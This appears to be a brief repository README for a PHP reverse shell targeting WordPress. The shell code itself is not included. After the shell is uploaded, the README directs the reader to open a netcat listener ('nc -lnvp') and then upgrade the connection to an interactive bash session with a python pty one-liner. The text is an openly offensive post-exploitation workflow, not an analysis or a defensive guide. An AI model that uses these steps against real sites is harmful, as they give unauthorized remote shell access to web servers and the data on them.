# php-reverse-shell
php reverse shell for WordPress

After to upload the revers shell you have to run:
$ nc -lnvp <portNo.>

Nice ! :D we have a shell let’s make it fancy now
run -->>
python -c 'import pty; pty.spawn("/bin/bash")'
